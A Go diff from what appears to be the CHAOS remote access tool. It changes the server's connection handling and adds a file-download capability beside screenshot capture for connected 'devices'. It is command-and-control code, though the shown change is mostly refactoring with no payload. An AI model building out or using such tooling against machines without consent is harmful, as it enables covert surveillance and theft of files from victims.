@@ -1,7 +1,6 @@
 package server
 
 import (
-	"bufio"
 	"encoding/json"
 	"fmt"
 	"github.com/c-bata/go-prompt"
@@ -9,7 +8,9 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/handler/client"
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
+	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
 	c "github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/models"
@@ -60,9 +61,9 @@ func (server *ServerHandler) AcceptConnections() {
 			continue
 		}
 
-		message, _ := bufio.NewReader(connection).ReadString(util.DelimiterByte)
+		message, _ := network.Read(connection)
 		var device models.Device
-		if err := json.Unmarshal([]byte(message), &device); err != nil {
+		if err := json.Unmarshal(message, &device); err != nil {
 			log.WithField("cause", err.Error()).Error("error decoding device")
 			return
 		}
@@ -141,10 +142,12 @@ func (server *ServerHandler) connect(v []string) {
 	defer device.Connection.Close()
 
 	// Use Case
-	screenshot := screenshot.NewScreenshotUseCase(device.Connection)
+	downloadUseCase := download.NewDownloadUseCase(device.Connection)
+	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
 
 	useCase := usecase.UseCase{
-		Screenshot: screenshot,
+		Download:   downloadUseCase,
+		Screenshot: screenshotUseCase,
 	}
 
 	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
